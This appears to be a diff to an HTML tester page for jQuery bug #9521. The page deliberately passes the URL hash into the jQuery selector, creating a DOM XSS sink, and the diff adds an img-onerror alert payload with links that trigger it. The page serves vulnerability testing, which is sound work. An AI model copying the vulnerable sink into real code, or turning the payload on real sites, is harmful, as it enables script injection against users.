@@ -10,24 +10,42 @@ Versions tested for successful attack:
 Versions tested for unsuccessful attack:
 <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
 -->
+<script>
+//  var attack1= "#<img src=x onerror='alert(\\\"" + msg + "\\\")'";
+  var attack1= "#<img src=x onerror=\"alert('Your jquery (" + jQuery.fn.jquery + ") is vulnerable to jquery bug #9521')\">";
+
+  function goto(hash){
+    location=location.href.split("#")[0]+hash;
+    console.log("About to reload the page...");
+    setTimeout(()=>(location.reload()),1000);
+    //console.log("Reload the page to view the expected results from the URI change.")
+  }
+</script>
 </head>
 <body>
+<h2>Jquery Bug #9521 Tester</h2>
 <div>
 	Attack tester for <a href="https://bugs.jquery.com/ticket/9521">jquery bug #9521</a>.
 	The vulnerable code is invisible javascript.
-	Try an attack via DOM XSS, by adding XSS payloads in the address bar.
+	Try an attack via DOM XSS, by adding XSS payloads in the address bar. See Attack #1 below for an example.
 </div>
 <br/>
 
 <div>
-<div id="1">This is a test div tag (id="1")</div> <br/>
-<div id="2">This is a test div tag (id="2")</div> <br/>
+<div id="1">This is a test div content(id="1")</div> <br/>
+<div id="2">This is a test div content (id="2")</div> <br/>
 <script>
-  setTimeout(() => $(decodeURI(location.hash)).css("font-weight","Bold"), 2000) 
+  setTimeout(() => $(decodeURI(location.hash)).css("font-weight","Bold"), 500);
 </script>
 </div>
 
-
+<h2>Test Links</h2>
+<ul>
+<li><a href='#1' onclick='setTimeout(()=>(location.reload()), 1000)'>Highlight #1</a></li>
+<li><a href='#2' onclick='setTimeout(()=>(location.reload()), 1000)'>Highlight #2</a></li>
+<li><a onclick='goto(attack1)'><b>Attack #1</b></a></li>
+</ul>
+</div>
 
 <div class="footer">
 <hr/>
